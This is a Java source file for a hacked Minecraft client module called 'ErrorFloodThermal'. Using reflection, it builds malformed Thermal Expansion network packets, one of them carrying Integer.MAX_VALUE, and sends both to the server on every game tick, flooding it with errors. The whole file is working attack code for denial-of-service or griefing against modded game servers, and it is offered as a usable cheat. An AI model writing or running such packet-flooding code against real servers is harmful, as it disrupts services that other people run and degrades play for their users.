package theic2.xenobyteport.modules.modded.hacks.flood;

import theic2.xenobyteport.api.module.Category;
import theic2.xenobyteport.api.module.PerformMode;
import theic2.xenobyteport.modules.modded.hacks.Hack;

import java.lang.reflect.Method;

public class ErrorFloodHack extends Hack {
    private Object packet;
    private Object packet2;
    private Method method;

    public ErrorFloodHack() {
        super("ErrorFloodThermal", Category.FUN, PerformMode.TOGGLE);
    }

    @Override
    public String moduleDesc() {
        return "Спам ошибками через термалку.";
    }

    @Override
    protected void hInit() throws Throwable {
        packet = Class.forName("cofh.thermalexpansion.network.PacketTEBase").newInstance();
        packet2 = Class.forName("cofh.core.network.PacketBase").getMethod("addByte", int.class).invoke(
                Class.forName("cofh.thermalexpansion.network.PacketTEBase").newInstance(), Integer.MAX_VALUE);
        method = Class.forName("cofh.core.network.PacketHandler").getMethod("sendToServer",
                Class.forName("cofh.core.network.PacketBase"));
    }

    @Override
    public void onTick(boolean inGame) {
        try {
            method.invoke(null, packet);
            method.invoke(null, packet2);
        } catch (Exception e) {
        }
    }
}
